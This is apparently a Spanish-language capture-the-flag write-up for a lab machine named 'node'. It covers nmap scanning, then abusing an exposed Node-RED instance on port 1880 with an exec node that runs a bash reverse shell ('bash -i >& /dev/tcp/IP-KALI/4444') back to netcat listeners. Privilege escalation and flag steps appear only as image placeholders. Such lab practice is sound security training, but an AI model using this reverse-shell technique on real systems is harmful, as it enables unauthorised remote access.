# Máquina node

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 192.168.42.164

![alt text](image-1.png)


### Servicios y versiones 

sudo nmap -sVC --min-rate 6000 -p22,80,1880 -vvv -Pn 192.168.42.163

![alt text](image-2.png)

Entramos en la web por el puerto 1880

![alt text](image-3.png)

### Explotación


en kali:

colocamos puertos en escucha

nc -lvnp 443 -> nodo tcp in

nc -lvnp 4444 -> nodo tcp out

en node-red:

nodo tcp in:

Type: connect to

port: 443

at host 192.168.42.133

en exec:

en command:

bash -c "bash -i >& /dev/tcp/IP-KALI/4444 0>&1"

en nodo tcp out:

Type: Reply to TCP

luego seleccionamos todo:

tcp in ------> exec ------> tcp out

(tiene que aparecer una sombra naranja)

y le damos clic en Deploy, tiene que salirme el mensaje Deplou suscessfully

le damos enter en la shell donde tenemos el puerto de escucha 443 y listo tenemos conexión en el puerto 4444

![alt text](image-4.png)

![alt text](image-5.png)

![alt text](image-6.png)

![alt text](image-7.png)

![alt text](image-8.png)

![alt text](image-9.png)

![alt text](image-10.png)

### Escalar privilegios

![alt text](image-11.png)

### user.txt

![alt text](image-12.png)

### root.txt

![alt text](image-13.png)

